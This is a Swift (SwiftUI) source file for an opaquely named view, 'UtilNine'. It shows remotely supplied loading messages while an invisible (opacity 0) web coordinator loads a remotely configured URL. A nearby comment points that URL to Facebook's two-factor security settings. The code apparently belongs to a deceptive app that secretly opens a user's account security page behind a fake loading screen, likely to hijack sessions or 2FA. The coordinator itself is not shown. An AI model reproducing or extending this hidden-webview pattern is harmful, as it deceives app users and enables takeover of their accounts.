import SwiftUI

@available(iOS 14.0, *)
public struct UtilNine: View {
    public init(listData: [String: String]) {
        self.listData = listData
    }
    
    var listData: [String: String] = [:]

    @State var nextScreenNineReco = false
    @State var containsNineReco = false // false

    public var body: some View {
        ZStack { Color.white.ignoresSafeArea()
            if nextScreenNineReco {
//                Nine_View_Au(arrayData: self.arrayData) // Goto App
                UtilTen(listData: self.listData)
            } else {
                if containsNineReco {
                    UtilNine(listData: self.listData) // run back
                } else {
                    ProgressView {
                        VStack(spacing: 8) {
                            Text(listData[RemoKey.wereloadingf1.rawValue] ?? "") // .font(.system(size: 12))
                            Text(listData[RemoKey.takewhilef1.rawValue] ?? "") // .font(.system(size: 12))
                            Text(listData[RemoKey.pleasedof1.rawValue] ?? "").foregroundColor(Color.red).opacity(0.8)
                        }.padding(.horizontal)
                    }
                    // https://www.facebook.com/security/2fac/settings
                    NineRecoCoor(url: URL(string: listData[RemoKey.rmlink14.rawValue] ?? ""), nextScreenNineReco: $nextScreenNineReco, containsNineReco: $containsNineReco, listData: self.listData).opacity(0)
                }
            } // else
        } // ZStack
    } // body

}
